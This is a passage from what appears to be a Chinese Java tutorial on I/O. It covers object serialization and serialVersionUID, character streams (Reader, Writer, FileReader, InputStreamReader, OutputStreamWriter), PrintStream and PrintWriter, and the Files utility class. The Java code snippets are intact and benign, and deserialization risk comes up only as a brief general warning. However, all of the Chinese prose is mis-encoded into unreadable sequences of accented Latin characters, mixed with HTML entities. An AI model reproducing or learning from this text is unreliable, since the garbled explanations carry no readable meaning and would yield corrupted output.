¹æ®classpathè¯»å–èµ„æºæ—¶ï¼Œéœ€è¦æ£€æŸ¥è¿”å›çš„InputStreamæ˜¯å¦ä¸ºnullã€‚ åºåˆ—åŒ–åºåˆ—åŒ–æ˜¯æŒ‡æŠŠä¸€ä¸ªJavaå¯¹è±¡å˜æˆäºŒè¿›åˆ¶å†…å®¹ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªbyte[]æ•°ç»„ã€‚ ä¸ºä»€ä¹ˆè¦æŠŠJavaå¯¹è±¡åºåˆ—åŒ–å‘¢ï¼Ÿå› ä¸ºåºåˆ—åŒ–åå¯ä»¥æŠŠbyte[]ä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼Œæˆ–è€…æŠŠbyte[]é€šè¿‡ç½‘ç»œä¼ è¾“åˆ°è¿œç¨‹ï¼Œè¿™æ ·ï¼Œå°±ç›¸å½“äºæŠŠJavaå¯¹è±¡å­˜å‚¨åˆ°æ–‡ä»¶æˆ–è€…é€šè¿‡ç½‘ç»œä¼ è¾“å‡ºå»äº†ã€‚ æœ‰åºåˆ—åŒ–ï¼Œå°±æœ‰ååºåˆ—åŒ–ï¼Œå³æŠŠä¸€ä¸ªäºŒè¿›åˆ¶å†…å®¹ï¼ˆä¹Ÿå°±æ˜¯byte[]æ•°ç»„ï¼‰å˜å›Javaå¯¹è±¡ã€‚æœ‰äº†ååºåˆ—åŒ–ï¼Œä¿å­˜åˆ°æ–‡ä»¶ä¸­çš„byte[]æ•°ç»„åˆå¯ä»¥â€œå˜å›â€Javaå¯¹è±¡ï¼Œæˆ–è€…ä»ç½‘ç»œä¸Šè¯»å–byte[]å¹¶æŠŠå®ƒâ€œå˜å›â€Javaå¯¹è±¡ã€‚ æˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•æŠŠä¸€ä¸ªJavaå¯¹è±¡åºåˆ—åŒ–ã€‚ ä¸€ä¸ªJavaå¯¹è±¡è¦èƒ½åºåˆ—åŒ–ï¼Œå¿…é¡»å®ç°ä¸€ä¸ªç‰¹æ®Šçš„java.io.Serializableæ¥å£ï¼Œå®ƒçš„å®šä¹‰å¦‚ä¸‹ï¼š public interface Serializable { } Serializableæ¥å£æ²¡æœ‰å®šä¹‰ä»»ä½•æ–¹æ³•ï¼Œå®ƒæ˜¯ä¸€ä¸ªç©ºæ¥å£ã€‚æˆ‘ä»¬æŠŠè¿™æ ·çš„ç©ºæ¥å£ç§°ä¸ºâ€œæ ‡è®°æ¥å£â€ï¼ˆMarker Interfaceï¼‰ï¼Œå®ç°äº†æ ‡è®°æ¥å£çš„ç±»ä»…ä»…æ˜¯ç»™è‡ªèº«è´´äº†ä¸ªâ€œæ ‡è®°â€ï¼Œå¹¶æ²¡æœ‰å¢åŠ ä»»ä½•æ–¹æ³•ã€‚ åºåˆ—åŒ–æŠŠä¸€ä¸ªJavaå¯¹è±¡å˜ä¸ºbyte[]æ•°ç»„ï¼Œéœ€è¦ä½¿ç”¨ObjectOutputStreamã€‚å®ƒè´Ÿè´£æŠŠä¸€ä¸ªJavaå¯¹è±¡å†™å…¥ä¸€ä¸ªå­—èŠ‚æµï¼š import java.io.*; import java.util.Arrays; public class Main { public static void main(String[] args) throws IOException { ByteArrayOutputStream buffer = new ByteArrayOutputStream(); try (ObjectOutputStream output = new ObjectOutputStream(buffer)) { // å†™å…¥int: output.writeInt(12345); // å†™å…¥String: output.writeUTF(&quot;Hello&quot;); // å†™å…¥Object: output.writeObject(Double.valueOf(123.456)); } System.out.println(Arrays.toString(buffer.toByteArray())); } } ObjectOutputStreamæ—¢å¯ä»¥å†™å…¥åŸºæœ¬ç±»å‹ï¼Œå¦‚intï¼Œbooleanï¼Œä¹Ÿå¯ä»¥å†™å…¥Stringï¼ˆä»¥UTF-8ç¼–ç ï¼‰ï¼Œè¿˜å¯ä»¥å†™å…¥å®ç°äº†Serializableæ¥å£çš„Objectã€‚ å› ä¸ºå†™å…¥Objectæ—¶éœ€è¦å¤§é‡çš„ç±»å‹ä¿¡æ¯ï¼Œæ‰€ä»¥å†™å…¥çš„å†…å®¹å¾ˆå¤§ã€‚ ååºåˆ—åŒ–å’ŒObjectOutputStreamç›¸åï¼ŒObjectInputStreamè´Ÿè´£ä»ä¸€ä¸ªå­—èŠ‚æµè¯»å–Javaå¯¹è±¡ï¼š try (ObjectInputStream input = new ObjectInputStream(...)) { int n = input.readInt(); String s = input.readUTF(); Double d = (Double) input.readObject(); } é™¤äº†èƒ½è¯»å–åŸºæœ¬ç±»å‹å’ŒStringç±»å‹å¤–ï¼Œè°ƒç”¨readObject()å¯ä»¥ç›´æ¥è¿”å›ä¸€ä¸ªObjectå¯¹è±¡ã€‚è¦æŠŠå®ƒå˜æˆä¸€ä¸ªç‰¹å®šç±»å‹ï¼Œå¿…é¡»å¼ºåˆ¶è½¬å‹ã€‚ readObject()å¯èƒ½æŠ›å‡ºçš„å¼‚å¸¸æœ‰ï¼š ClassNotFoundExceptionï¼šæ²¡æœ‰æ‰¾åˆ°å¯¹åº”çš„Classï¼› InvalidClassExceptionï¼šClassä¸åŒ¹é…ã€‚ å¯¹äºClassNotFoundExceptionï¼Œè¿™ç§æƒ…å†µå¸¸è§äºä¸€å°ç”µè„‘ä¸Šçš„Javaç¨‹åºæŠŠä¸€ä¸ªJavaå¯¹è±¡ï¼Œä¾‹å¦‚ï¼ŒPersonå¯¹è±¡åºåˆ—åŒ–ä»¥åï¼Œé€šè¿‡ç½‘ç»œä¼ ç»™å¦ä¸€å°ç”µè„‘ä¸Šçš„å¦ä¸€ä¸ªJavaç¨‹åºï¼Œä½†æ˜¯è¿™å°ç”µè„‘çš„Javaç¨‹åºå¹¶æ²¡æœ‰å®šä¹‰Personç±»ï¼Œæ‰€ä»¥æ— æ³•ååºåˆ—åŒ–ã€‚ å¯¹äºInvalidClassExceptionï¼Œè¿™ç§æƒ…å†µå¸¸è§äºåºåˆ—åŒ–çš„Personå¯¹è±¡å®šä¹‰äº†ä¸€ä¸ªintç±»å‹çš„ageå­—æ®µï¼Œä½†æ˜¯ååºåˆ—åŒ–æ—¶ï¼ŒPersonç±»å®šä¹‰çš„ageå­—æ®µè¢«æ”¹æˆäº†longç±»å‹ï¼Œæ‰€ä»¥å¯¼è‡´classä¸å…¼å®¹ã€‚ ä¸ºäº†é¿å…è¿™ç§classå®šä¹‰å˜åŠ¨å¯¼è‡´çš„ä¸å…¼å®¹ï¼ŒJavaçš„åºåˆ—åŒ–å…è®¸classå®šä¹‰ä¸€ä¸ªç‰¹æ®Šçš„serialVersionUIDé™æ€å˜é‡ï¼Œç”¨äºæ ‡è¯†Javaç±»çš„åºåˆ—åŒ–â€œç‰ˆæœ¬â€ï¼Œé€šå¸¸å¯ä»¥ç”±IDEè‡ªåŠ¨ç”Ÿæˆã€‚å¦‚æœå¢åŠ æˆ–ä¿®æ”¹äº†å­—æ®µï¼Œå¯ä»¥æ”¹å˜serialVersionUIDçš„å€¼ï¼Œè¿™æ ·å°±èƒ½è‡ªåŠ¨é˜»æ­¢ä¸åŒ¹é…çš„classç‰ˆæœ¬ï¼š public class Person implements Serializable { private static final long serialVersionUID = 2709425275741743919L; } è¦ç‰¹åˆ«æ³¨æ„ååºåˆ—åŒ–çš„å‡ ä¸ªé‡è¦ç‰¹ç‚¹ï¼š ååºåˆ—åŒ–æ—¶ï¼Œç”±JVMç›´æ¥æ„é€ å‡ºJavaå¯¹è±¡ï¼Œä¸è°ƒç”¨æ„é€ æ–¹æ³•ï¼Œæ„é€ æ–¹æ³•å†…éƒ¨çš„ä»£ç ï¼Œåœ¨ååºåˆ—åŒ–æ—¶æ ¹æœ¬ä¸å¯èƒ½æ‰§è¡Œã€‚ å®‰å…¨æ€§å› ä¸ºJavaçš„åºåˆ—åŒ–æœºåˆ¶å¯ä»¥å¯¼è‡´ä¸€ä¸ªå®ä¾‹èƒ½ç›´æ¥ä»byte[]æ•°ç»„åˆ›å»ºï¼Œè€Œä¸ç»è¿‡æ„é€ æ–¹æ³•ï¼Œå› æ­¤ï¼Œå®ƒå­˜åœ¨ä¸€å®šçš„å®‰å…¨éšæ‚£ã€‚ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„byte[]æ•°ç»„è¢«ååºåˆ—åŒ–åå¯ä»¥æ‰§è¡Œç‰¹å®šçš„Javaä»£ç ï¼Œä»è€Œå¯¼è‡´ä¸¥é‡çš„å®‰å…¨æ¼æ´ã€‚ å®é™…ä¸Šï¼ŒJavaæœ¬èº«æä¾›çš„åŸºäºå¯¹è±¡çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶æ—¢å­˜åœ¨å®‰å…¨æ€§é—®é¢˜ï¼Œä¹Ÿå­˜åœ¨å…¼å®¹æ€§é—®é¢˜ã€‚æ›´å¥½çš„åºåˆ—åŒ–æ–¹æ³•æ˜¯é€šè¿‡JSONè¿™æ ·çš„é€šç”¨æ•°æ®ç»“æ„æ¥å®ç°ï¼Œåªè¾“å‡ºåŸºæœ¬ç±»å‹ï¼ˆåŒ…æ‹¬Stringï¼‰çš„å†…å®¹ï¼Œè€Œä¸å­˜å‚¨ä»»ä½•ä¸ä»£ç ç›¸å…³çš„ä¿¡æ¯ã€‚ å°ç»“å¯åºåˆ—åŒ–çš„Javaå¯¹è±¡å¿…é¡»å®ç°java.io.Serializableæ¥å£ï¼Œç±»ä¼¼Serializableè¿™æ ·çš„ç©ºæ¥å£è¢«ç§°ä¸ºâ€œæ ‡è®°æ¥å£â€ï¼ˆMarker Interfaceï¼‰ï¼› ååºåˆ—åŒ–æ—¶ä¸è°ƒç”¨æ„é€ æ–¹æ³•ï¼Œå¯è®¾ç½®serialVersionUIDä½œä¸ºç‰ˆæœ¬å·ï¼ˆéå¿…éœ€ï¼‰ï¼› Javaçš„åºåˆ—åŒ–æœºåˆ¶ä»…é€‚ç”¨äºJavaï¼Œå¦‚æœéœ€è¦ä¸å…¶å®ƒè¯­è¨€äº¤æ¢æ•°æ®ï¼Œå¿…é¡»ä½¿ç”¨é€šç”¨çš„åºåˆ—åŒ–æ–¹æ³•ï¼Œä¾‹å¦‚JSONã€‚ ReaderReaderæ˜¯Javaçš„IOåº“æä¾›çš„å¦ä¸€ä¸ªè¾“å…¥æµæ¥å£ã€‚å’ŒInputStreamçš„åŒºåˆ«æ˜¯ï¼ŒInputStreamæ˜¯ä¸€ä¸ªå­—èŠ‚æµï¼Œå³ä»¥byteä¸ºå•ä½è¯»å–ï¼Œè€ŒReaderæ˜¯ä¸€ä¸ªå­—ç¬¦æµï¼Œå³ä»¥charä¸ºå•ä½è¯»å–ï¼š InputStream Reader å­—èŠ‚æµï¼Œä»¥byteä¸ºå•ä½ å­—ç¬¦æµï¼Œä»¥charä¸ºå•ä½ è¯»å–å­—èŠ‚ï¼ˆ-1ï¼Œ0~255ï¼‰ï¼šint read() è¯»å–å­—ç¬¦ï¼ˆ-1ï¼Œ0~65535ï¼‰ï¼šint read() è¯»åˆ°å­—èŠ‚æ•°ç»„ï¼šint read(byte[] b) è¯»åˆ°å­—ç¬¦æ•°ç»„ï¼šint read(char[] c) java.io.Readeræ˜¯æ‰€æœ‰å­—ç¬¦è¾“å…¥æµçš„è¶…ç±»ï¼Œå®ƒæœ€ä¸»è¦çš„æ–¹æ³•æ˜¯ï¼š public int read() throws IOException; è¿™ä¸ªæ–¹æ³•è¯»å–å­—ç¬¦æµçš„ä¸‹ä¸€ä¸ªå­—ç¬¦ï¼Œå¹¶è¿”å›å­—ç¬¦è¡¨ç¤ºçš„intï¼ŒèŒƒå›´æ˜¯0~65535ã€‚å¦‚æœå·²è¯»åˆ°æœ«å°¾ï¼Œè¿”å›-1ã€‚ FileReaderFileReaderæ˜¯Readerçš„ä¸€ä¸ªå­ç±»ï¼Œå®ƒå¯ä»¥æ‰“å¼€æ–‡ä»¶å¹¶è·å–Readerã€‚ä¸‹é¢çš„ä»£ç æ¼”ç¤ºäº†å¦‚ä½•å®Œæ•´åœ°è¯»å–ä¸€ä¸ªFileReaderçš„æ‰€æœ‰å­—ç¬¦ï¼š public void readFile() throws IOException { // åˆ›å»ºä¸€ä¸ªFileReaderå¯¹è±¡: Reader reader = new FileReader(&quot;src/readme.txt&quot;); // å­—ç¬¦ç¼–ç æ˜¯??? for (;;) { int n = reader.read(); // åå¤è°ƒç”¨read()æ–¹æ³•ï¼Œç›´åˆ°è¿”å›-1 if (n == -1) { break; } System.out.println((char)n); // æ‰“å°char } reader.close(); // å…³é—­æµ } å¦‚æœæˆ‘ä»¬è¯»å–ä¸€ä¸ªçº¯ASCIIç¼–ç çš„æ–‡æœ¬æ–‡ä»¶ï¼Œä¸Šè¿°ä»£ç å·¥ä½œæ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚ä½†å¦‚æœæ–‡ä»¶ä¸­åŒ…å«ä¸­æ–‡ï¼Œå°±ä¼šå‡ºç°ä¹±ç ï¼Œå› ä¸ºFileReaderé»˜è®¤çš„ç¼–ç ä¸ç³»ç»Ÿç›¸å…³ï¼Œä¾‹å¦‚ï¼ŒWindowsç³»ç»Ÿçš„é»˜è®¤ç¼–ç å¯èƒ½æ˜¯GBKï¼Œæ‰“å¼€ä¸€ä¸ªUTF-8ç¼–ç çš„æ–‡æœ¬æ–‡ä»¶å°±ä¼šå‡ºç°ä¹±ç ã€‚ è¦é¿å…ä¹±ç é—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦åœ¨åˆ›å»ºFileReaderæ—¶æŒ‡å®šç¼–ç ï¼š Reader reader = new FileReader(&quot;src/readme.txt&quot;, StandardCharsets.UTF_8); å’ŒInputStreamç±»ä¼¼ï¼ŒReaderä¹Ÿæ˜¯ä¸€ç§èµ„æºï¼Œéœ€è¦ä¿è¯å‡ºé”™çš„æ—¶å€™ä¹Ÿèƒ½æ­£ç¡®å…³é—­ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”¨try (resource)æ¥ä¿è¯Readeråœ¨æ— è®ºæœ‰æ²¡æœ‰IOé”™è¯¯çš„æ—¶å€™éƒ½èƒ½å¤Ÿæ­£ç¡®åœ°å…³é—­ï¼š try (Reader reader = new FileReader(&quot;src/readme.txt&quot;, StandardCharsets.UTF_8) { // TODO } Readerè¿˜æä¾›äº†ä¸€æ¬¡æ€§è¯»å–è‹¥å¹²å­—ç¬¦å¹¶å¡«å……åˆ°char[]æ•°ç»„çš„æ–¹æ³•ï¼š public int read(char[] c) throws IOException å®ƒè¿”å›å®é™…è¯»å…¥çš„å­—ç¬¦ä¸ªæ•°ï¼Œæœ€å¤§ä¸è¶…è¿‡char[]æ•°ç»„çš„é•¿åº¦ã€‚è¿”å›-1è¡¨ç¤ºæµç»“æŸã€‚ åˆ©ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆè®¾ç½®ä¸€ä¸ªç¼“å†²åŒºï¼Œç„¶åï¼Œæ¯æ¬¡å°½å¯èƒ½åœ°å¡«å……ç¼“å†²åŒºï¼š public void readFile() throws IOException { try (Reader reader = new FileReader(&quot;src/readme.txt&quot;, StandardCharsets.UTF_8)) { char[] buffer = new char[1000]; int n; while ((n = reader.read(buffer)) != -1) { System.out.println(&quot;read &quot; + n + &quot; chars.&quot;); } } } CharArrayReaderCharArrayReaderå¯ä»¥åœ¨å†…å­˜ä¸­æ¨¡æ‹Ÿä¸€ä¸ªReaderï¼Œå®ƒçš„ä½œç”¨å®é™…ä¸Šæ˜¯æŠŠä¸€ä¸ªchar[]æ•°ç»„å˜æˆä¸€ä¸ªReaderï¼Œè¿™å’ŒByteArrayInputStreaméå¸¸ç±»ä¼¼ï¼š try (Reader reader = new CharArrayReader(&quot;Hello&quot;.toCharArray())) { } StringReaderStringReaderå¯ä»¥ç›´æ¥æŠŠStringä½œä¸ºæ•°æ®æºï¼Œå®ƒå’ŒCharArrayReaderå‡ ä¹ä¸€æ ·ï¼š try (Reader reader = new StringReader(&quot;Hello&quot;)) { } InputStreamReaderReaderå’ŒInputStreamæœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿ é™¤äº†ç‰¹æ®Šçš„CharArrayReaderå’ŒStringReaderï¼Œæ™®é€šçš„Readerå®é™…ä¸Šæ˜¯åŸºäºInputStreamæ„é€ çš„ï¼Œå› ä¸ºReaderéœ€è¦ä»InputStreamä¸­è¯»å…¥å­—èŠ‚æµï¼ˆbyteï¼‰ï¼Œç„¶åï¼Œæ ¹æ®ç¼–ç è®¾ç½®ï¼Œå†è½¬æ¢ä¸ºcharå°±å¯ä»¥å®ç°å­—ç¬¦æµã€‚å¦‚æœæˆ‘ä»¬æŸ¥çœ‹FileReaderçš„æºç ï¼Œå®ƒåœ¨å†…éƒ¨å®é™…ä¸ŠæŒæœ‰ä¸€ä¸ªFileInputStreamã€‚ æ—¢ç„¶Readeræœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªåŸºäºInputStreamçš„byteåˆ°charçš„è½¬æ¢å™¨ï¼Œé‚£ä¹ˆï¼Œå¦‚æœæˆ‘ä»¬å·²ç»æœ‰ä¸€ä¸ªInputStreamï¼Œæƒ³æŠŠå®ƒè½¬æ¢ä¸ºReaderï¼Œæ˜¯å®Œå…¨å¯è¡Œçš„ã€‚InputStreamReaderå°±æ˜¯è¿™æ ·ä¸€ä¸ªè½¬æ¢å™¨ï¼Œå®ƒå¯ä»¥æŠŠä»»ä½•InputStreamè½¬æ¢ä¸ºReaderã€‚ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š // æŒæœ‰InputStream: InputStream input = new FileInputStream(&quot;src/readme.txt&quot;); // å˜æ¢ä¸ºReader: Reader reader = new InputStreamReader(input, &quot;UTF-8&quot;); æ„é€ InputStreamReaderæ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä¼ å…¥InputStreamï¼Œè¿˜éœ€è¦æŒ‡å®šç¼–ç ï¼Œå°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªReaderå¯¹è±¡ã€‚ä¸Šè¿°ä»£ç å¯ä»¥é€šè¿‡try (resource)æ›´ç®€æ´åœ°æ”¹å†™å¦‚ä¸‹ï¼š try (Reader reader = new InputStreamReader(new FileInputStream(&quot;src/readme.txt&quot;), &quot;UTF-8&quot;)) { // TODO: } ä¸Šè¿°ä»£ç å®é™…ä¸Šå°±æ˜¯FileReaderçš„ä¸€ç§å®ç°æ–¹å¼ã€‚ ä½¿ç”¨try (resource)ç»“æ„æ—¶ï¼Œå½“æˆ‘ä»¬å…³é—­Readeræ—¶ï¼Œå®ƒä¼šåœ¨å†…éƒ¨è‡ªåŠ¨è°ƒç”¨InputStreamçš„close()æ–¹æ³•ï¼Œæ‰€ä»¥ï¼Œåªéœ€è¦å…³é—­æœ€å¤–å±‚çš„Readerå¯¹è±¡å³å¯ã€‚ :heavy_exclamation_mark:ä½¿ç”¨InputStreamReaderï¼Œå¯ä»¥æŠŠä¸€ä¸ªInputStreamè½¬æ¢æˆä¸€ä¸ªReaderã€‚ å°ç»“Readerå®šä¹‰äº†æ‰€æœ‰å­—ç¬¦è¾“å…¥æµçš„è¶…ç±»ï¼š FileReaderå®ç°äº†æ–‡ä»¶å­—ç¬¦æµè¾“å…¥ï¼Œä½¿ç”¨æ—¶éœ€è¦æŒ‡å®šç¼–ç ï¼› CharArrayReaderå’ŒStringReaderå¯ä»¥åœ¨å†…å­˜ä¸­æ¨¡æ‹Ÿä¸€ä¸ªå­—ç¬¦æµè¾“å…¥ã€‚ Readeræ˜¯åŸºäºInputStreamæ„é€ çš„ï¼šå¯ä»¥é€šè¿‡InputStreamReaderåœ¨æŒ‡å®šç¼–ç çš„åŒæ—¶å°†ä»»ä½•InputStreamè½¬æ¢ä¸ºReaderã€‚ æ€»æ˜¯ä½¿ç”¨try (resource)ä¿è¯Readeræ­£ç¡®å…³é—­ã€‚ WriterReaderæ˜¯å¸¦ç¼–ç è½¬æ¢å™¨çš„InputStreamï¼Œå®ƒæŠŠbyteè½¬æ¢ä¸ºcharï¼Œè€ŒWriterå°±æ˜¯å¸¦ç¼–ç è½¬æ¢å™¨çš„OutputStreamï¼Œå®ƒæŠŠcharè½¬æ¢ä¸ºbyteå¹¶è¾“å‡ºã€‚ Writerå’ŒOutputStreamçš„åŒºåˆ«å¦‚ä¸‹ï¼š OutputStream Writer å­—èŠ‚æµï¼Œä»¥byteä¸ºå•ä½ å­—ç¬¦æµï¼Œä»¥charä¸ºå•ä½ å†™å…¥å­—èŠ‚ï¼ˆ0~255ï¼‰ï¼švoid write(int b) å†™å…¥å­—ç¬¦ï¼ˆ0~65535ï¼‰ï¼švoid write(int c) å†™å…¥å­—èŠ‚æ•°ç»„ï¼švoid write(byte[] b) å†™å…¥å­—ç¬¦æ•°ç»„ï¼švoid write(char[] c) æ— å¯¹åº”æ–¹æ³• å†™å…¥Stringï¼švoid write(String s) Writeræ˜¯æ‰€æœ‰å­—ç¬¦è¾“å‡ºæµçš„è¶…ç±»ï¼Œå®ƒæä¾›çš„æ–¹æ³•ä¸»è¦æœ‰ï¼š å†™å…¥ä¸€ä¸ªå­—ç¬¦ï¼ˆ0~65535ï¼‰ï¼švoid write(int c)ï¼› å†™å…¥å­—ç¬¦æ•°ç»„çš„æ‰€æœ‰å­—ç¬¦ï¼švoid write(char[] c)ï¼› å†™å…¥Stringè¡¨ç¤ºçš„æ‰€æœ‰å­—ç¬¦ï¼švoid write(String s)ã€‚ FileWriterFileWriterå°±æ˜¯å‘æ–‡ä»¶ä¸­å†™å…¥å­—ç¬¦æµçš„Writerã€‚å®ƒçš„ä½¿ç”¨æ–¹æ³•å’ŒFileReaderç±»ä¼¼ï¼š try (Writer writer = new FileWriter(&quot;readme.txt&quot;, StandardCharsets.UTF_8)) { writer.write(&#39;H&#39;); // å†™å…¥å•ä¸ªå­—ç¬¦ writer.write(&quot;Hello&quot;.toCharArray()); // å†™å…¥char[] writer.write(&quot;Hello&quot;); // å†™å…¥String } CharArrayWriterCharArrayWriterå¯ä»¥åœ¨å†…å­˜ä¸­åˆ›å»ºä¸€ä¸ªWriterï¼Œå®ƒçš„ä½œç”¨å®é™…ä¸Šæ˜¯æ„é€ ä¸€ä¸ªç¼“å†²åŒºï¼Œå¯ä»¥å†™å…¥charï¼Œæœ€åå¾—åˆ°å†™å…¥çš„char[]æ•°ç»„ï¼Œè¿™å’ŒByteArrayOutputStreaméå¸¸ç±»ä¼¼ï¼š try (CharArrayWriter writer = new CharArrayWriter()) { writer.write(65); writer.write(66); writer.write(67); char[] data = writer.toCharArray(); // { &#39;A&#39;, &#39;B&#39;, &#39;C&#39; } } StringWriterStringWriterä¹Ÿæ˜¯ä¸€ä¸ªåŸºäºå†…å­˜çš„Writerï¼Œå®ƒå’ŒCharArrayWriterç±»ä¼¼ã€‚å®é™…ä¸Šï¼ŒStringWriteråœ¨å†…éƒ¨ç»´æŠ¤äº†ä¸€ä¸ªStringBufferï¼Œå¹¶å¯¹å¤–æä¾›äº†Writeræ¥å£ã€‚ OutputStreamWriteré™¤äº†CharArrayWriterå’ŒStringWriterå¤–ï¼Œæ™®é€šçš„Writerå®é™…ä¸Šæ˜¯åŸºäºOutputStreamæ„é€ çš„ï¼Œå®ƒæ¥æ”¶charï¼Œç„¶ååœ¨å†…éƒ¨è‡ªåŠ¨è½¬æ¢æˆä¸€ä¸ªæˆ–å¤šä¸ªbyteï¼Œå¹¶å†™å…¥OutputStreamã€‚å› æ­¤ï¼ŒOutputStreamWriterå°±æ˜¯ä¸€ä¸ªå°†ä»»æ„çš„OutputStreamè½¬æ¢ä¸ºWriterçš„è½¬æ¢å™¨ï¼š try (Writer writer = new OutputStreamWriter(new FileOutputStream(&quot;readme.txt&quot;), &quot;UTF-8&quot;)) { // TODO: } ä¸Šè¿°ä»£ç å®é™…ä¸Šå°±æ˜¯FileWriterçš„ä¸€ç§å®ç°æ–¹å¼ã€‚è¿™å’Œä¸Šä¸€èŠ‚çš„InputStreamReaderæ˜¯ä¸€æ ·çš„ã€‚ å°ç»“Writerå®šä¹‰äº†æ‰€æœ‰å­—ç¬¦è¾“å‡ºæµçš„è¶…ç±»ï¼š FileWriterå®ç°äº†æ–‡ä»¶å­—ç¬¦æµè¾“å‡ºï¼› CharArrayWriterå’ŒStringWriteråœ¨å†…å­˜ä¸­æ¨¡æ‹Ÿä¸€ä¸ªå­—ç¬¦æµè¾“å‡ºã€‚ ä½¿ç”¨try (resource)ä¿è¯Writeræ­£ç¡®å…³é—­ã€‚ Writeræ˜¯åŸºäºOutputStreamæ„é€ çš„ï¼Œå¯ä»¥é€šè¿‡OutputStreamWriterå°†OutputStreamè½¬æ¢ä¸ºWriterï¼Œè½¬æ¢æ—¶éœ€è¦æŒ‡å®šç¼–ç ã€‚ PrintStreamå’ŒPrintWriterPrintStreamæ˜¯ä¸€ç§FilterOutputStreamï¼Œå®ƒåœ¨OutputStreamçš„æ¥å£ä¸Šï¼Œé¢å¤–æä¾›äº†ä¸€äº›å†™å…¥å„ç§æ•°æ®ç±»å‹çš„æ–¹æ³•ï¼š å†™å…¥intï¼šprint(int) å†™å…¥booleanï¼šprint(boolean) å†™å…¥Stringï¼šprint(String) å†™å…¥Objectï¼šprint(Object)ï¼Œå®é™…ä¸Šç›¸å½“äºprint(object.toString()) â€¦ ä»¥åŠå¯¹åº”çš„ä¸€ç»„println()æ–¹æ³•ï¼Œå®ƒä¼šè‡ªåŠ¨åŠ ä¸Šæ¢è¡Œç¬¦ã€‚ æˆ‘ä»¬ç»å¸¸ä½¿ç”¨çš„System.out.println()å®é™…ä¸Šå°±æ˜¯ä½¿ç”¨PrintStreamæ‰“å°å„ç§æ•°æ®ã€‚å…¶ä¸­ï¼ŒSystem.outæ˜¯ç³»ç»Ÿé»˜è®¤æä¾›çš„PrintStreamï¼Œè¡¨ç¤ºæ ‡å‡†è¾“å‡ºï¼š System.out.print(12345); // è¾“å‡º12345 System.out.print(new Object()); // è¾“å‡ºç±»ä¼¼java.lang.Object@3c7a835a System.out.println(&quot;Hello&quot;); // è¾“å‡ºHelloå¹¶æ¢è¡Œ System.erræ˜¯ç³»ç»Ÿé»˜è®¤æä¾›çš„æ ‡å‡†é”™è¯¯è¾“å‡ºã€‚ PrintStreamå’ŒOutputStreamç›¸æ¯”ï¼Œé™¤äº†æ·»åŠ äº†ä¸€ç»„print()/println()æ–¹æ³•ï¼Œå¯ä»¥æ‰“å°å„ç§æ•°æ®ç±»å‹ï¼Œæ¯”è¾ƒæ–¹ä¾¿å¤–ï¼Œå®ƒè¿˜æœ‰ä¸€ä¸ªé¢å¤–çš„ä¼˜ç‚¹ï¼Œå°±æ˜¯ä¸ä¼šæŠ›å‡ºIOExceptionï¼Œè¿™æ ·æˆ‘ä»¬åœ¨ç¼–å†™ä»£ç çš„æ—¶å€™ï¼Œå°±ä¸å¿…æ•è·IOExceptionã€‚ PrintWriterPrintStreamæœ€ç»ˆè¾“å‡ºçš„æ€»æ˜¯byteæ•°æ®ï¼Œè€ŒPrintWriteråˆ™æ˜¯æ‰©å±•äº†Writeræ¥å£ï¼Œå®ƒçš„print()/println()æ–¹æ³•æœ€ç»ˆè¾“å‡ºçš„æ˜¯charæ•°æ®ã€‚ä¸¤è€…çš„ä½¿ç”¨æ–¹æ³•å‡ ä¹æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ï¼š import java.io.*; public class Main { public static void main(String[] args) { StringWriter buffer = new StringWriter(); try (PrintWriter pw = new PrintWriter(buffer)) { pw.println(&quot;Hello&quot;); pw.println(12345); pw.println(true); } System.out.println(buffer.toString()); } } å°ç»“PrintStreamæ˜¯ä¸€ç§èƒ½æ¥æ”¶å„ç§æ•°æ®ç±»å‹çš„è¾“å‡ºï¼Œæ‰“å°æ•°æ®æ—¶æ¯”è¾ƒæ–¹ä¾¿ï¼š System.outæ˜¯æ ‡å‡†è¾“å‡ºï¼› System.erræ˜¯æ ‡å‡†é”™è¯¯è¾“å‡ºã€‚ PrintWriteræ˜¯åŸºäºWriterçš„è¾“å‡ºã€‚ ä½¿ç”¨Filesä»Java 7å¼€å§‹ï¼Œæä¾›äº†Fileså’ŒPathsè¿™ä¸¤ä¸ªå·¥å…·ç±»ï¼Œèƒ½æå¤§åœ°æ–¹ä¾¿æˆ‘ä»¬è¯»å†™æ–‡ä»¶ã€‚ è™½ç„¶Fileså’ŒPathsæ˜¯java.nioåŒ…é‡Œé¢çš„ç±»ï¼Œä½†ä»–ä¿©å°è£…äº†å¾ˆå¤šè¯»å†™æ–‡ä»¶çš„ç®€å•æ–¹æ³•ï¼Œä¾‹å¦‚ï¼Œæˆ‘ä»¬è¦æŠŠä¸€ä¸ªæ–‡ä»¶çš„å…¨éƒ¨å†…å®¹è¯»å–ä¸ºä¸€ä¸ªbyte[]ï¼Œå¯ä»¥è¿™ä¹ˆå†™ï¼š byte[] data = Files.readAllBytes(Paths.get(&quot;/path/to/file.txt&quot;)); å¦‚æœæ˜¯æ–‡æœ¬æ–‡ä»¶ï¼Œå¯ä»¥æŠŠä¸€ä¸ªæ–‡ä»¶çš„å…¨éƒ¨å†…å®¹è¯»å–ä¸ºStringï¼š // é»˜è®¤ä½¿ç”¨UTF-8ç¼–ç è¯»å–: String content1 = Files.readString(Paths.get(&quot;/path/to/file.txt&quot;)); // å¯æŒ‡å®šç¼–ç : String content2 = Files.readString(Paths.get(&quot;/path/to/file.txt&quot;), StandardCharsets.ISO_8859_1); // æŒ‰è¡Œè¯»å–å¹¶è¿”å›æ¯è¡Œå†…å®¹: List&lt;String&gt; lines = Files.readAllLines(Paths.get(&quot;/path/to/file.txt&quot;)); å†™å…¥æ–‡ä»¶ä¹Ÿéå¸¸æ–¹ä¾¿ï¼š // 